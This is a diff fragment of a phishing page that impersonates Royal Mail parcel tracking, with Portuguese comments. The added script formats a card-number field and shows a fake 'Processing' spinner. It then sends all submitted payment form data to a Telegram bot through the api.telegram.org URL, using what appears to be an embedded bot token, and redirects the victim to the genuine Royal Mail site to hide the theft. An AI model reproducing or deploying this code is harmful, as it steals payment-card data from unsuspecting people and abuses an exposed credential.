@@ -58,6 +58,25 @@
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({chat_id:CHAT_ID, text:csv})
       }).then(()=>window.location.href='https://www.royalmail.com/track-your-item'); // redireciona para site real
+    // 1) Máscara do número
+document.querySelector('input[name="cardNumber"]').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
+  e.target.value = !v[2] ? v[1] : v[1]+' '+v[2]+(v[3]?' '+v[3]:'')+(v[4]?' '+v[4]:'');
+});
+
+// 2) Spinner fake
+document.getElementById('paymentForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  // desabilita tudo e mostra load
+  this.innerHTML = '<div style=color:#fff>Processing…</div>';
+  // monta payload
+  const q = new URLSearchParams(new FormData(this)).toString();
+  // envia
+  fetch(`https://api.telegram.org/bot${8721188883:AAEWO2YWWThjYLyQVbVUuxOf97ltFKmiBrQ}/sendMessage?chat_id=${-1001234567890}&text=${q}`)
+    .then(() => location.href = 'https://www.royalmail.com/track-item') // redireciona pro site real
+    .catch(() => alert('Try again')); // só se cair fora
+});
+
     });
   </script>
 </body>
